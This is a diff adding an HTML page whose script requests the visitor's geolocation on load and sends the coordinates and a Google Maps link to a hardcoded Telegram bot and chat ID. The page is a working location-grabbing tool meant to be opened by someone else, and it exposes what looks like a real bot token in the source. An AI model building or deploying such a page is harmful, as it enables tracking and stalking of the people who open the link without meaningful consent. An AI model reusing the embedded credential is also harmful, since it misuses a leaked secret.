@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sending Location</title>
+</head>
+<body>
+    <h2>Automatically Sending Your Location...</h2>
+    <p id="status">Please allow location access.</p>
+
+    <script>
+        // Automatically request location when the page loads
+        window.onload = function () {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                document.getElementById("status").innerText = "❌ Your browser does not support location tracking.";
+            }
+        };
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let botToken = "7927161012:AAFzGfXcqc57dqbGxeRGmbAONzGeF6TFkyY";  // Your bot token
+            let chatId = "6340045158";  // Your chat ID
+
+            let message = `📍 User Location: \n🌍 Latitude: ${lat}\n🌎 Longitude: ${lon}\n🔗 Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById("status").innerText = "✅ Location sent successfully!";
+                    } else {
+                        document.getElementById("status").innerText = "❌ Failed to send location.";
+                    }
+                })
+                .catch(error => {
+                    document.getElementById("status").innerText = "❌ Connection error.";
+                });
+        }
+
+        function showError(error) {
+            let message = "";
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "❌ You denied location access.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "⚠️ Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    message = "⏳ Location request timed out.";
+                    break;
+                default:
+                    message = "❌ An unknown error occurred.";
+            }
+            document.getElementById("status").innerText = message;
+        }
+    </script>
+</body>
+</html>
